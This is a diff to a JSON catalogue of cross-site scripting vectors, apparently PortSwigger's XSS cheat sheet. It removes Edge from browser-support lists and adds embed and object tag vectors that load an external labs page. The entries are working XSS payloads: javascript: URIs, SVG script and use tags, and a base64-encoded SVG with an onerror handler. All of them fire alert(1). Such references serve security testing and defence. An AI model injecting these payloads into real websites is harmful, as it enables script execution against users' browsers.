@@ -4,8 +4,7 @@
         "code": "<iframe src=\"javascript:alert(1)\">",
         "browsers": [
             "chrome",
-            "firefox",
-            "edge",
+            "firefox",        
             "safari"
         ]
     },
@@ -28,8 +27,7 @@
         "code": "<a href=\"javascript:alert(1)\">XSS<\/a>",
         "browsers": [
             "chrome",
-            "firefox",
-            "edge",
+            "firefox",        
             "safari"
         ]
     },
@@ -38,8 +36,7 @@
         "code": "<a href=\"JaVaScript:alert(1)\">XSS<\/a>",
         "browsers": [
             "chrome",
-            "firefox",
-            "edge",
+            "firefox",        
             "safari"
         ]
     },
@@ -48,8 +45,7 @@
         "code": "<a href=\" \tjavascript:alert(1)\">XSS<\/a>",
         "browsers": [
             "chrome",
-            "firefox",
-            "edge",
+            "firefox",        
             "safari"
         ]
     },
@@ -59,7 +55,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -69,7 +64,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -79,7 +73,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -89,7 +82,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -99,7 +91,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -109,7 +100,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -119,7 +109,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -127,8 +116,7 @@
         "description": "SVG script href attribute without closing script tag",
         "code": "<svg><script href=\"data:text\/javascript,alert(1)\" \/>",
         "browsers": [
-            "firefox",
-            "edge"
+            "firefox"
         ]
     },
     {
@@ -145,7 +133,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -169,7 +156,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -179,7 +165,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -189,7 +174,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -199,7 +183,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -209,7 +192,6 @@
         "browsers": [
             "chrome",
             "firefox",
-            "edge",
             "safari"
         ]
     },
@@ -218,8 +200,7 @@
         "code": "<svg><use href=\"data:image\/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x\" \/><\/svg>",
         "browsers": [
             "chrome",
-            "firefox",
-            "edge"
+            "firefox"
         ]
     },
     {
@@ -236,8 +217,42 @@
         "code": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image\/svg+xml,&lt;svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg'&gt;&lt;image href='1' onerror='alert(1)' \/&gt;&lt;\/svg&gt;#x\" \/><use id=x \/>",
         "browsers": [
             "chrome",
-            "firefox",
-            "edge"
+            "firefox"
         ]
-    }
+    },
+    {
+        "description": "Embed supports code attribute",
+        "code": "<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>",
+        "browsers": [
+            "chrome"
+        ]
+    },
+    {
+        "description": "Object tag supports param url",
+        "code": "<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>",
+        "browsers": [
+            "chrome"
+        ]
+    },
+    {
+        "description": "Object tag supports param code",
+        "code": "<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>",
+        "browsers": [
+            "chrome"        
+        ]
+    },
+    {
+        "description": "Object tag supports param movie",
+        "code": "<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>",
+        "browsers": [
+            "chrome"        
+        ]
+    },
+    {
+        "description": "Object tag supports param src",
+        "code": "<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>",
+        "browsers": [
+            "chrome"        
+        ]
+    }    
 ]
